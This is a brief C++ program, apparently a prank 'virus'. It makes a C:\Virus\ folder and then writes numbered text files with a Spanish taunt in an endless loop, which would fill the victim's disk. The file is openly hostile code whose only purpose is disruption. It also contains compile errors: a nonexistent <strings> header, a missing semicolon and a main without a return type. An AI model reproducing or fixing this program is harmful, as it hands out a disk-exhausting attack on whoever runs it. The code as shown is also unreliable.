#include <iostream>
#include <fstream>
#include <strings>
#include <direct.h>

main(){

    long i=0;
    const char *path="C:\\Virus\\";
    std::string content="Virus rico que te has zampado campeón."
    _mkdir(path);
    while(true){
        i++;
        std::ofstream file;
        file.open(path+std::to_string(i)+".txt", std::ios_base::out);
        file << content;
        file.close();
        std::cout << "Archivo creado: " + std::to_string(i)+ "\r\n";

    }

}
